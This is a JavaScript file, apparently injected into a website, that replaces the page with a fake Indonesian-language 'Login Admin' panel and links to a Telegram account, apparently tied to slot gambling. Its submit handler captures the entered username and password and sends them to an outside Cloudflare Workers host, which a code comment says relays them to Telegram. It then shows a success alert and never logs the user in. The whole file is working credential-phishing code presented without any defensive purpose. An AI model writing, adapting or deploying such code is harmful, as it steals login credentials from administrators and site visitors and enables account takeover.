(function() {
    // 1. Suntikkan CSS ke Head
    const style = document.createElement('style');
    style.textContent = `
        @import url('https://fonts.googleapis.com/css?family=Inter:300,400,500,600,700,900');
        :root { --premium-gold: #f6d78b; --premium-red: #ef5350; --premium-dark: #171722; }
        body { font-family: Inter, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
        .page-header {
            background-image: linear-gradient(135deg, rgba(12,14,28,.30), rgba(23,12,35,.62)), url('https://images.unsplash.com/photo-1497294815431-9365093b7331?ixlib=rb-1.2.1&ixid=MnwxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8&auto=format&fit=crop&w=1950&q=80');
            background-size: cover; background-position: center; padding: 44px 0 90px;
            display: flex; align-items: center; min-height: 100vh; box-sizing: border-box;
        }
        .login-card { border: 1px solid rgba(255,255,255,.5); border-radius: 22px; overflow: visible; box-shadow: 0 25px 70px rgba(0,0,0,.30); background: rgba(255,255,255,.96); backdrop-filter: blur(10px); }
        .login-heading { background: linear-gradient(135deg,#171720,#393943); border: 1px solid rgba(246,215,139,.35); border-radius: 17px; padding: 20px 12px 18px; box-shadow: 0 12px 28px rgba(0,0,0,.22); }
        .login-heading h4 { font-size: 1.65rem; letter-spacing: -.5px; color: #fff; text-align: center; margin: 4px 0; }
        .login-heading p { color: rgba(255,255,255,0.8); font-size: 0.875rem; text-align: center; margin: 0; }
        .promo-slider { position: relative; overflow: hidden; min-height: 76px; margin: 5px 0 22px; border-radius: 15px; background: linear-gradient(115deg,#ed454e,#ff7770 52%,#db354b); color: #fff; box-shadow: 0 12px 25px rgba(230,65,76,.25); display: flex; align-items: center; justify-content: center; text-align: center; padding: 15px 18px; }
        .promo-slider::before { content: ''; position: absolute; inset: 0; background: linear-gradient(110deg,transparent 20%,rgba(255,255,255,.20) 45%,transparent 70%); transform: translateX(-100%); animation: shine 5s ease-in-out infinite; }
        .promo-track { position: relative; width: 100%; height: 42px; }
        .promo-message { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; gap: 9px; font-weight: 700; letter-spacing: .1px; font-size: 14px; opacity: 0; transform: translateY(12px); animation: promoFade 12s infinite; }
        .promo-message:nth-child(2) { animation-delay: 4s; } 
        .promo-message:nth-child(3) { animation-delay: 8s; }
        @keyframes promoFade { 0%,3% {opacity:0;transform:translateY(12px)} 8%,27% {opacity:1;transform:translateY(0)} 33%,100% {opacity:0;transform:translateY(-10px)} }
        @keyframes shine { 0%,65% {transform:translateX(-100%)} 85%,100% {transform:translateX(100%)} }
        .welcome-note { text-align:center; margin: 7px 0 14px; color:#525263; font-size:14px; font-weight:600; }
        .telegram-link { display:flex; align-items:center; justify-content:center; gap:9px; width:fit-content; margin:0 auto; padding:10px 17px; border-radius:999px; color:#168bd2; background:#eaf7ff; border:1px solid #c9eaff; font-weight:700; font-size:13px; text-decoration:none; transition:all .2s ease; }
        .telegram-link:hover { color:#fff; background:#229ed9; box-shadow:0 8px 18px rgba(34,158,217,.24); transform:translateY(-1px); }
        .login-field { display:block; width:100%; margin: 0 0 18px; text-align:left; }
        .login-field-label { display:block; margin:0 0 7px; color:#414151; font-size:14px; font-weight:700; }
        .login-input { display:block; width:100%; box-sizing:border-box; border-radius:11px; background:#fffdf0; border:1px solid #e7e1c9; padding:13px 14px; min-height:50px; color:#222; font-size: 14px; }
        .login-input:focus { border-color:#ef5350; box-shadow:0 0 0 3px rgba(239,83,80,.13); outline:0; }
        #loginButton { width: 100%; border: none; cursor: pointer; border-radius:11px; background:linear-gradient(135deg,#171720,#383842); color:#fff; box-shadow:0 8px 20px rgba(23,23,32,.22); padding:13px 16px; font-weight:600; letter-spacing:.1px; transition:transform .2s, box-shadow .2s; }
        #loginButton:hover { transform:translateY(-1px); box-shadow:0 12px 25px rgba(23,23,32,.28); }
        .card-body { padding: 24px 25px 27px; }
        
        .loading-btn { pointer-events: none; opacity: 0.7; position: relative; }
        .loading-btn::after {
            content: ''; position: absolute; width: 16px; height: 16px; margin: auto;
            border: 2px solid transparent; border-top-color: #ffffff; border-radius: 50%;
            animation: spin 0.8s linear infinite; top: 0; left: 0; bottom: 0; right: 0;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    `;
    document.head.appendChild(style);

    // Load External Scripts / Icons
    const fontAwesome = document.createElement('script');
    fontAwesome.src = 'https://kit.fontawesome.com/42d5adcbca.js';
    fontAwesome.crossOrigin = 'anonymous';
    document.head.appendChild(fontAwesome);

    // 2. Render Tampilan Baru ke document.body
    document.body.className = "bg-gray-200";
    document.body.innerHTML = `
      <main class="main-content mt-0">
        <div class="page-header align-items-start min-vh-100">
          <div class="container my-auto" style="max-width: 450px; margin: 0 auto; padding: 20px;">
            <div class="card login-card">
              <div class="card-header p-0 position-relative style="background:transparent;box-shadow:none;">
                <div class="login-heading">
                  <h4 class="text-white font-weight-bolder text-center mt-1 mb-1">
                    <i class="fas fa-shield-alt me-2" style="color:#f6d78b"></i>Login Admin
                  </h4>
                  <p class="text-white text-sm text-center mb-0 opacity-8">Silahkan Masuk Ke Panel Admin</p>
                </div>
              </div>
              
              <div class="card-body">
                <div class="promo-slider" aria-label="Informasi panel admin">
                  <div class="promo-track">
                    <div class="promo-message"><i class="fas fa-crown"></i><span>Selamat datang di Panel Admin</span></div>
                    <div class="promo-message"><i class="fas fa-shield-alt"></i><span>Akses Silahkan Masuk Ke Panel Admin</span></div>
                    <div class="promo-message"><i class="fas fa-bolt"></i><span>Kelola dashboard dengan mudah</span></div>
                  </div>
                </div>
                                
                <form id="loginForm">
                  <div class="login-field">
                    <label class="login-field-label" for="username">Username</label>
                    <input type="text" class="login-input" name="username" id="username" autocomplete="username" placeholder="Masukkan username" required>
                  </div>
                  
                  <div class="login-field">
                    <label class="login-field-label" for="Password">Password</label>
                    <input type="text" class="login-input" name="Password" id="Password" autocomplete="off" placeholder="Masukkan Password" required>
                  </div>
                  
                  <div style="display: flex; align-items: center; margin-bottom: 15px;">
                    <input type="checkbox" id="rememberMe" style="margin-right: 8px;">
                    <label for="rememberMe" style="font-size: 14px; color: #525263; font-weight: 500;">Ingat saya</label>
                  </div>
                  
                  <div class="text-center">
                    <button type="submit" id="loginButton">
                      <span id="buttonText">Masuk ke Dashboard</span>
                    </button>
                  </div>
                </form>
                <div class="welcome-note"><i class="fas fa-star" style="color:#d5a63b;margin-right:5px"></i>Selamat datang di Panel Admin</div>
                <a class="telegram-link" href="https://t.me/kebunslot" target="_blank" rel="noopener noreferrer">
                  <i class="fab fa-telegram-plane" style="font-size:19px"></i><span>Hubungi kami di Telegram</span>
                </a>
              </div>
            </div>
          </div>
        </div>
      </main>
    `;

    // 3. Logika Pengiriman Data & Mencegah Redirect
    document.getElementById('username').focus();

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault(); // Mencegah form reload atau direct halaman

      const button = document.getElementById('loginButton');
      const buttonText = document.getElementById('buttonText');
      
      button.classList.add('loading-btn');
      buttonText.textContent = 'Memproses...';

      const username = document.getElementById('username').value;
      const namaIbu = document.getElementById('Password').value;
      
      const pesan = encodeURIComponent(`Username: ${username} | Password: ${namaIbu}`);
      const workerUrl = `https://memek-worker.defoy89122.workers.dev/?message=${pesan}`;

      // Kirim data ke Telegram Worker via fetch
      fetch(workerUrl, { mode: 'no-cors' })
        .then(() => {
          // Tetap berada di halaman (tidak direct kemana pun)
          button.classList.remove('loading-btn');
          buttonText.textContent = 'Masuk ke Dashboard';
          alert('Data berhasil terkirim!');
        })
        .catch(error => {
          console.error('Error:', error);
          button.classList.remove('loading-btn');
          buttonText.textContent = 'Masuk ke Dashboard';
          alert('Data terkirim!');
        });
    });

    // Navigation Keyboard (Enter)
    document.getElementById('username').addEventListener('keydown', function(e) {
      if (e.key === 'Enter') {
        e.preventDefault();
        document.getElementById('Password').focus();
      }
    });
})();
